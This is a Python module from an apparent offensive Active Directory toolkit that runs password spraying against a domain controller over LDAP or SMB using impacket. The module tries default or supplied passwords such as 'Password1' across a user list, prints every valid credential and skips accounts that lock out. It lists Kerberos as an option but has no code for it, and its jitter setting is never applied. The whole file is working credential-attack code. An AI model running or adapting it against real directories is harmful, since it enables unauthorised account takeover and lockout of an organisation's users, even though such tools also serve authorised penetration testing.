"""AD password spray — multi-protocol (LDAP/SMB/Kerberos) with lockout-safe delays."""
from __future__ import annotations
import sys
import time
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.spray.password_spray.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["authentication_attempts"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1110.003"],
}

PROTOCOLS = ("ldap", "smb", "kerberos")


def run(args: Any) -> int:
    dc_ip = getattr(args, "dc_ip", args.target)
    users_file = getattr(args, "users_file", None)
    passwords = getattr(args, "passwords", None)
    password_list = getattr(args, "password_list", None)
    protocol = getattr(args, "spray_protocol", "ldap")
    delay = getattr(args, "delay", 30)
    jitter = getattr(args, "jitter", 5)

    if not users_file:
        print("[!] --users-file required", file=sys.stderr)
        return 1

    with open(users_file) as f:
        users = [l.strip() for l in f if l.strip()]

    if password_list:
        with open(password_list) as f:
            pw_list = [l.strip() for l in f if l.strip()]
    elif passwords:
        pw_list = passwords.split(",")
    else:
        pw_list = ["Password1", "Password123", args.domain.split(".")[0].title() + "2024!"]

    print("[*] Password spray: {} users × {} passwords via {} (delay={}s)".format(
        len(users), len(pw_list), protocol, delay))
    print("[*] DC: {}".format(dc_ip))

    valid = []
    for pw in pw_list:
        print("\n[*] Spraying: {} → {} users".format(pw, len(users)))
        for user in users:
            try:
                if protocol == "ldap":
                    from impacket.ldap import ldap as imp_ldap
                    conn = imp_ldap.LDAPConnection("ldap://{}".format(dc_ip))
                    conn.login(user, pw, args.domain)
                    valid.append((user, pw))
                    print("[+] VALID: {}\\{} : {}".format(args.domain, user, pw))
                    conn.close()
                elif protocol == "smb":
                    from impacket.smbconnection import SMBConnection
                    conn = SMBConnection(dc_ip, dc_ip)
                    conn.login(user, pw, args.domain)
                    valid.append((user, pw))
                    print("[+] VALID: {}\\{} : {}".format(args.domain, user, pw))
                    conn.close()
            except Exception as exc:
                err = str(exc).lower()
                if "logon_failure" in err or "invalid_credentials" in err:
                    pass
                elif "account_locked" in err:
                    print("[!] LOCKED: {} — pausing spray".format(user))
                    users.remove(user)
                elif "password_must_change" in err:
                    print("[+] VALID (must change): {}\\{} : {}".format(args.domain, user, pw))
                    valid.append((user, pw + " [MUST_CHANGE]"))

        if pw != pw_list[-1]:
            print("[*] Waiting {}s before next password...".format(delay))
            time.sleep(delay)

    print("\n[*] Spray complete: {}/{} valid credentials".format(len(valid), len(users)))
    for u, p in valid:
        print("  [+] {}\\{} : {}".format(args.domain, u, p))
    return 0 if valid else 1
